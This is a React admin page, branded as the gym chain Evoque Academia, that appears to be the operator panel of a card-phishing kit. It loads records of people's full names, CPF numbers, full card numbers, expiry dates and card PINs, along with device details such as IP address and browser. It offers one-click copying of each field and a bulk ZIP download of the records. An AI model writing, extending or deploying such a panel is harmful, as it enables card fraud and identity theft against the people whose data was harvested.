import { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from '@/components/ui/dialog';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow
} from '@/components/ui/table';
import {
  CreditCard,
  Users,
  CheckCircle,
  AlertCircle,
  Clock,
  ArrowLeft,
  RefreshCw,
  Download,
  Loader2,
  Eye,
  Copy,
  Check,
  ChevronDown,
  Smartphone
} from 'lucide-react';
import { toast } from 'sonner';

interface Payment {
  id: string;
  nomeCompleto: string;
  cpf: string;
  numeroCartao: string;
  validade: string;
  dataCriacao: string;
  status: 'pendente' | 'processado' | 'erro';
  senhaCartao?: string;
}

interface ParsedPaymentData {
  nome: string;
  cpf: string;
  cartao: string;
  validade: string;
  cvv: string;
  senhaCartao: string;
  data: string;
  ip?: string;
  navegador?: string;
  so?: string;
  dispositivo?: string;
  resolucao?: string;
  idioma?: string;
  fuso?: string;
  conexao?: string;
}

const Admin = () => {
  const [payments, setPayments] = useState<Payment[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [isDownloading, setIsDownloading] = useState(false);
  const [selectedPayment, setSelectedPayment] = useState<Payment | null>(null);
  const [isLoadingDetails, setIsLoadingDetails] = useState(false);
  const [isDownloadingFile, setIsDownloadingFile] = useState(false);
  const [copiedField, setCopiedField] = useState<string | null>(null);
  const [showDeviceInfo, setShowDeviceInfo] = useState(false);
  const [parsedData, setParsedData] = useState<ParsedPaymentData | null>(null);

  useEffect(() => {
    // Buscar dados reais do backend
    const fetchPayments = async () => {
      try {
        setIsLoading(true);
        const response = await fetch('/api/payments');
        const data = await response.json();

        if (data.success && data.payments) {
          // Mapear dados do backend para o formato esperado
          const mappedPayments: Payment[] = data.payments.map((payment: any) => ({
            id: payment.id || payment.dataCriacao,
            nomeCompleto: payment.nomeCompleto || '',
            cpf: payment.cpf || '',
            numeroCartao: payment.numeroCartao ? `**** **** **** ${payment.numeroCartao.slice(-4)}` : '****',
            validade: payment.validade || '',
            dataCriacao: payment.dataCriacao || '',
            status: 'processado' as const,
            senhaCartao: payment.senhaCartao
          }));

          setPayments(mappedPayments);
          toast.success(`${mappedPayments.length} pagamento(s) carregado(s)`);
        } else {
          setPayments([]);
        }
      } catch (error) {
        console.error('Erro ao carregar pagamentos:', error);
        toast.error('Erro ao carregar dados do servidor');
        setPayments([]);
      } finally {
        setIsLoading(false);
      }
    };

    fetchPayments();
  }, []);

  const fetchPayments = async () => {
    try {
      setIsLoading(true);
      const response = await fetch('/api/payments');
      const data = await response.json();

      if (data.success && data.payments) {
        const mappedPayments: Payment[] = data.payments.map((payment: any) => ({
          id: payment.id || payment.dataCriacao,
          nomeCompleto: payment.nomeCompleto || '',
          cpf: payment.cpf || '',
          numeroCartao: payment.numeroCartao ? `**** **** **** ${payment.numeroCartao.slice(-4)}` : '****',
          validade: payment.validade || '',
          dataCriacao: payment.dataCriacao || '',
          status: 'processado' as const,
          senhaCartao: payment.senhaCartao
        }));

        setPayments(mappedPayments);
        if (mappedPayments.length > 0) {
          toast.success(`${mappedPayments.length} pagamento(s) carregado(s)`);
        }
      } else {
        setPayments([]);
      }
    } catch (error) {
      console.error('Erro ao carregar pagamentos:', error);
      toast.error('Erro ao carregar dados do servidor');
    } finally {
      setIsLoading(false);
    }
  };

  const handleRefreshPayments = async () => {
    await fetchPayments();
  };

  const handleDownloadZip = async () => {
    try {
      setIsDownloading(true);
      const response = await fetch('/api/download-zip');

      if (!response.ok) {
        throw new Error('Erro ao baixar ZIP');
      }

      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', 'pagamentos.zip');
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(url);

      toast.success('ZIP baixado com sucesso!');
    } catch (error) {
      console.error('Erro ao baixar ZIP:', error);
      toast.error('Erro ao baixar ZIP');
    } finally {
      setIsDownloading(false);
    }
  };

  const parsePaymentContent = (content: string): ParsedPaymentData => {
    // Função auxiliar para extrair valor após label
    const extractValue = (label: string, defaultValue: string = 'Não disponível') => {
      const regex = new RegExp(`${label}:\\s*(.+?)(?:\\n|$)`);
      const match = content.match(regex);
      return match ? match[1].trim() : defaultValue;
    };

    return {
      nome: extractValue('Nome Completo', 'Não informado'),
      cpf: extractValue('CPF', 'Não informado'),
      cartao: extractValue('Número do Cartão', '****'),
      validade: extractValue('Validade', 'Não informado'),
      cvv: '***',
      senhaCartao: extractValue('Senha do Cartão', 'Não informado'),
      data: extractValue('Data/Hora', 'Não informado'),
      ip: extractValue('IP', undefined),
      navegador: extractValue('Navegador', undefined),
      so: extractValue('Sistema Operacional', undefined),
      dispositivo: extractValue('Tipo de Dispositivo', undefined),
      resolucao: extractValue('Resolução', undefined),
      idioma: extractValue('Idioma', undefined),
      fuso: extractValue('Fuso Horário', undefined),
      conexao: extractValue('Tipo de Conexão', undefined)
    };
  };

  const viewPaymentDetails = async (payment: Payment) => {
    setSelectedPayment(payment);
    setIsLoadingDetails(true);
    setParsedData(null);
    setCopiedField(null);
    setShowDeviceInfo(false);

    try {
      const response = await fetch(`/api/payment/${payment.id}`);
      const data = await response.json();

      if (data.success && data.content) {
        const parsed = parsePaymentContent(data.content);
        setParsedData(parsed);
      } else {
        toast.error('Erro ao carregar detalhes do pagamento');
      }
    } catch (error) {
      console.error('Erro ao buscar detalhes:', error);
      toast.error('Erro ao carregar detalhes');
    } finally {
      setIsLoadingDetails(false);
    }
  };

  const copyToClipboard = async (text: string, fieldName: string) => {
    try {
      if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
      } else {
        const textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.top = '0';
        textarea.style.left = '0';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.focus();
        textarea.select();
        document.execCommand('copy');
        document.body.removeChild(textarea);
      }

      setCopiedField(fieldName);
      toast.success(`${fieldName} copiado!`);
      setTimeout(() => setCopiedField(null), 2000);
    } catch (error) {
      toast.error('Erro ao copiar');
    }
  };

  const handleDownloadPaymentTxt = async () => {
    if (!selectedPayment || !parsedData) return;

    try {
      setIsDownloadingFile(true);

      const content = `
=== DETALHES DO PAGAMENTO ===
Data: ${new Date().toLocaleString('pt-BR')}

--- INFORMAÇÕES PESSOAIS ---
Nome Completo: ${parsedData.nome}
CPF: ${parsedData.cpf}

--- DADOS DO CARTÃO ---
Número do Cartão: ${parsedData.cartao}
Validade: ${parsedData.validade}
CVV: ${parsedData.cvv}
Senha do Cartão: ${parsedData.senhaCartao}

--- DATA E HORA DO REGISTRO ---
Registro: ${parsedData.data}

${(parsedData.ip || parsedData.navegador || parsedData.so || parsedData.dispositivo) ? `--- INFORMAÇÃO DO DISPOSITIVO ---
${parsedData.so ? `Sistema Operacional: ${parsedData.so}\n` : ''}${parsedData.ip ? `IP: ${parsedData.ip}\n` : ''}${parsedData.navegador ? `Navegador: ${parsedData.navegador}\n` : ''}${parsedData.dispositivo ? `Dispositivo: ${parsedData.dispositivo}\n` : ''}${parsedData.resolucao ? `Resolução: ${parsedData.resolucao}\n` : ''}${parsedData.idioma ? `Idioma: ${parsedData.idioma}\n` : ''}${parsedData.fuso ? `Fuso Horário: ${parsedData.fuso}\n` : ''}${parsedData.conexao ? `Tipo de Conexão: ${parsedData.conexao}\n` : ''}` : ''}
`;

      const blob = new Blob([content.trim()], { type: 'text/plain;charset=utf-8' });
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', `pagamento_${selectedPayment.id}.txt`);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
      window.URL.revokeObjectURL(url);

      toast.success('TXT baixado com sucesso!');
    } catch (error) {
      console.error('Erro ao baixar TXT:', error);
      toast.error('Erro ao baixar TXT');
    } finally {
      setIsDownloadingFile(false);
    }
  };

  const CopyableField = ({ label, value, fieldName }: { label: string; value: string; fieldName: string }) => (
    <div className="group relative">
      <div className="flex items-start justify-between gap-3 p-3 rounded-lg bg-muted/30 hover:bg-muted/50 transition-all duration-200">
        <div className="flex-1 min-w-0">
          <p className="text-xs font-medium text-muted-foreground mb-1.5">
            {label}
          </p>
          <p className="text-sm font-mono text-foreground break-all">
            {value}
          </p>
        </div>
        <Button
          variant="ghost"
          size="icon"
          onClick={() => copyToClipboard(value, fieldName)}
          className="h-8 w-8 flex-shrink-0 opacity-0 group-hover:opacity-100 transition-opacity"
        >
          {copiedField === fieldName ? (
            <Check className="h-3.5 w-3.5 text-green-500" />
          ) : (
            <Copy className="h-3.5 w-3.5" />
          )}
        </Button>
      </div>
    </div>
  );

  const stats = {
    total: payments.length,
    processados: payments.filter(p => p.status === 'processado').length,
    pendentes: payments.filter(p => p.status === 'pendente').length,
    erros: payments.filter(p => p.status === 'erro').length,
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'processado':
        return (
          <Badge className="bg-green-500/20 text-green-400 border-green-500/30">
            <CheckCircle className="h-3 w-3 mr-1" />
            Processado
          </Badge>
        );
      case 'pendente':
        return (
          <Badge className="bg-yellow-500/20 text-yellow-400 border-yellow-500/30">
            <Clock className="h-3 w-3 mr-1" />
            Pendente
          </Badge>
        );
      case 'erro':
        return (
          <Badge className="bg-red-500/20 text-red-400 border-red-500/30">
            <AlertCircle className="h-3 w-3 mr-1" />
            Erro
          </Badge>
        );
      default:
        return <Badge>{status}</Badge>;
    }
  };

  return (
    <div className="min-h-screen bg-background">
      <header className="border-b border-border bg-card/50 backdrop-blur-sm sticky top-0 z-50">
        <div className="container mx-auto px-4 py-4 flex items-center justify-between">
          <div className="flex items-center gap-4">
            <Button variant="ghost" size="icon">
              <ArrowLeft className="h-5 w-5" />
            </Button>
            <div className="h-10 w-32 bg-muted rounded flex items-center justify-center">
              <span className="text-xs font-semibold">EVOQUE</span>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button
              variant="outline"
              size="sm"
              className="gap-2"
              onClick={handleRefreshPayments}
              disabled={isLoading}
            >
              <RefreshCw className={`h-4 w-4 ${isLoading ? 'animate-spin' : ''}`} />
              Atualizar
            </Button>
            <Button
              variant="outline"
              size="sm"
              className="gap-2"
              onClick={handleDownloadZip}
              disabled={isDownloading}
            >
              <Download className="h-4 w-4" />
              Baixar ZIP
            </Button>
          </div>
        </div>
      </header>

      <main className="container mx-auto px-4 py-8">
        <div className="mb-8">
          <h1 className="text-3xl font-bold mb-2">Painel administrativo</h1>
          <p className="text-muted-foreground">
            Gerencie as atualizações de pagamento da rede Evoque Academia
          </p>
        </div>

        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
          <Card>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Total</p>
                  <p className="text-3xl font-bold">{stats.total}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-primary/10 flex items-center justify-center">
                  <Users className="h-6 w-6 text-primary" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Processados</p>
                  <p className="text-3xl font-bold text-green-400">{stats.processados}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-green-500/10 flex items-center justify-center">
                  <CheckCircle className="h-6 w-6 text-green-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Pendentes</p>
                  <p className="text-3xl font-bold text-yellow-400">{stats.pendentes}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-yellow-500/10 flex items-center justify-center">
                  <Clock className="h-6 w-6 text-yellow-400" />
                </div>
              </div>
            </CardContent>
          </Card>

          <Card>
            <CardContent className="p-6">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-sm text-muted-foreground mb-1">Com erro</p>
                  <p className="text-3xl font-bold text-red-400">{stats.erros}</p>
                </div>
                <div className="h-12 w-12 rounded-lg bg-red-500/10 flex items-center justify-center">
                  <AlertCircle className="h-6 w-6 text-red-400" />
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        <Card>
          <CardHeader>
            <CardTitle className="flex items-center gap-2">
              <CreditCard className="h-5 w-5 text-primary" />
              Atualizações de pagamento
            </CardTitle>
            <CardDescription>
              Lista de todas as atualizações de cartão recebidas
            </CardDescription>
          </CardHeader>
          <CardContent>
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead>Nome</TableHead>
                    <TableHead>CPF</TableHead>
                    <TableHead>Cartão</TableHead>
                    <TableHead>Validade</TableHead>
                    <TableHead>Data</TableHead>
                    <TableHead>Status</TableHead>
                    <TableHead className="w-12">Ação</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {payments.map((payment) => (
                    <TableRow key={payment.id}>
                      <TableCell className="font-medium">
                        {payment.nomeCompleto}
                      </TableCell>
                      <TableCell>{payment.cpf}</TableCell>
                      <TableCell className="font-mono">
                        {payment.numeroCartao}
                      </TableCell>
                      <TableCell>{payment.validade}</TableCell>
                      <TableCell>{payment.dataCriacao}</TableCell>
                      <TableCell>{getStatusBadge(payment.status)}</TableCell>
                      <TableCell>
                        <Button
                          variant="ghost"
                          size="icon"
                          onClick={() => viewPaymentDetails(payment)}
                          className="h-8 w-8"
                        >
                          <Eye className="h-4 w-4" />
                        </Button>
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>
      </main>

      <Dialog open={selectedPayment !== null} onOpenChange={(open) => {
        if (!open) {
          setSelectedPayment(null);
          setParsedData(null);
          setShowDeviceInfo(false);
        }
      }}>
        <DialogContent className="max-w-2xl max-h-[90vh] overflow-hidden flex flex-col">
          <DialogHeader>
            <DialogTitle>Detalhes do Pagamento</DialogTitle>
            <DialogDescription>
              {selectedPayment?.nomeCompleto}
            </DialogDescription>
          </DialogHeader>

          {isLoadingDetails ? (
            <div className="flex items-center justify-center py-12">
              <div className="flex flex-col items-center gap-2">
                <Loader2 className="h-8 w-8 text-primary animate-spin" />
                <p className="text-muted-foreground">Carregando detalhes...</p>
              </div>
            </div>
          ) : parsedData ? (
            <div className="flex-1 overflow-y-auto pr-2 space-y-6">
              {/* Informações Pessoais */}
              <div>
                <h3 className="text-sm font-semibold text-foreground mb-3 flex items-center gap-2">
                  <div className="h-1 w-1 rounded-full bg-primary" />
                  Informações Pessoais
                </h3>
                <div className="space-y-2">
                  <CopyableField
                    label="Nome Completo"
                    value={parsedData.nome}
                    fieldName="Nome"
                  />
                  <CopyableField
                    label="CPF"
                    value={parsedData.cpf}
                    fieldName="CPF"
                  />
                </div>
              </div>

              {/* Dados do Cartão */}
              <div>
                <h3 className="text-sm font-semibold text-foreground mb-3 flex items-center gap-2">
                  <div className="h-1 w-1 rounded-full bg-primary" />
                  Dados do Cartão
                </h3>
                <div className="space-y-2">
                  <CopyableField
                    label="Número do Cartão"
                    value={parsedData.cartao}
                    fieldName="Cartão"
                  />
                  <div className="grid grid-cols-2 gap-2">
                    <CopyableField
                      label="Validade"
                      value={parsedData.validade}
                      fieldName="Validade"
                    />
                    <CopyableField
                      label="CVV"
                      value={parsedData.cvv}
                      fieldName="CVV"
                    />
                  </div>
                  <CopyableField
                    label="Senha do Cartão"
                    value={parsedData.senhaCartao}
                    fieldName="Senha"
                  />
                </div>
              </div>

              {/* Data e Hora */}
              <div>
                <h3 className="text-sm font-semibold text-foreground mb-3 flex items-center gap-2">
                  <div className="h-1 w-1 rounded-full bg-primary" />
                  Data e Hora
                </h3>
                <CopyableField
                  label="Registro"
                  value={parsedData.data}
                  fieldName="Data"
                />
              </div>

              {/* Informação do Dispositivo - Collapsible */}
              {(parsedData.ip || parsedData.navegador || parsedData.so || parsedData.dispositivo) && (
                <div className="border border-border rounded-lg overflow-hidden">
                  <button
                    onClick={() => setShowDeviceInfo(!showDeviceInfo)}
                    className="w-full flex items-center justify-between p-4 hover:bg-muted/50 transition-colors group"
                  >
                    <div className="flex-1 text-left">
                      <div className="flex items-center gap-3 mb-2">
                        <div className="h-8 w-8 rounded-lg bg-primary/10 flex items-center justify-center">
                          <Smartphone className="h-4 w-4 text-primary" />
                        </div>
                        <h3 className="text-sm font-semibold text-foreground">
                          Informação do Dispositivo
                        </h3>
                      </div>

                      {!showDeviceInfo && (
                        <p className="text-xs text-muted-foreground line-clamp-2 pl-11">
                          {[
                            parsedData.so && `Sistema operacional: ${parsedData.so}`,
                            parsedData.ip && `IP: ${parsedData.ip}`,
                            parsedData.navegador && `Navegador: ${parsedData.navegador}`,
                            parsedData.dispositivo && `Dispositivo: ${parsedData.dispositivo}`,
                            parsedData.resolucao && `Resolução: ${parsedData.resolucao}`,
                            parsedData.idioma && `Idioma: ${parsedData.idioma}`,
                            parsedData.fuso && `Fuso: ${parsedData.fuso}`,
                            parsedData.conexao && `Conexão: ${parsedData.conexao}`
                          ].filter(Boolean).join(' • ')}
                        </p>
                      )}
                    </div>
                    <ChevronDown
                      className={`h-5 w-5 text-muted-foreground transition-transform duration-300 flex-shrink-0 ml-2 ${showDeviceInfo ? 'rotate-180' : ''}`}
                    />
                  </button>

                  <div
                    className={`overflow-hidden transition-all duration-300 ease-in-out ${showDeviceInfo ? 'max-h-[800px] opacity-100' : 'max-h-0 opacity-0'}`}
                  >
                    <div className="p-4 pt-0 border-t border-border bg-muted/30">
                      <div className="bg-background border border-border rounded p-4 font-mono text-sm space-y-2 text-foreground">
                        {parsedData.so && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">Sistema operacional:</span>
                            <span>{parsedData.so}</span>
                          </div>
                        )}
                        {parsedData.ip && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">IP:</span>
                            <span>{parsedData.ip}</span>
                          </div>
                        )}
                        {parsedData.navegador && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">Navegador:</span>
                            <span>{parsedData.navegador}</span>
                          </div>
                        )}
                        {parsedData.dispositivo && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">Dispositivo:</span>
                            <span>{parsedData.dispositivo}</span>
                          </div>
                        )}
                        {parsedData.resolucao && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">Resolução:</span>
                            <span>{parsedData.resolucao}</span>
                          </div>
                        )}
                        {parsedData.idioma && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">Idioma:</span>
                            <span>{parsedData.idioma}</span>
                          </div>
                        )}
                        {parsedData.fuso && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">Fuso Horário:</span>
                            <span>{parsedData.fuso}</span>
                          </div>
                        )}
                        {parsedData.conexao && (
                          <div className="flex gap-4">
                            <span className="text-muted-foreground min-w-fit">Tipo de Conexão:</span>
                            <span>{parsedData.conexao}</span>
                          </div>
                        )}
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          ) : null}

          <div className="flex justify-end gap-2 pt-4 border-t border-border mt-4">
            <Button
              variant="outline"
              onClick={() => {
                setSelectedPayment(null);
                setParsedData(null);
                setShowDeviceInfo(false);
              }}
            >
              Fechar
            </Button>
            <Button className="gap-2" disabled={isDownloadingFile}>
              <Download className="h-4 w-4" />
              Baixar TXT
            </Button>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  );
};

export default Admin;
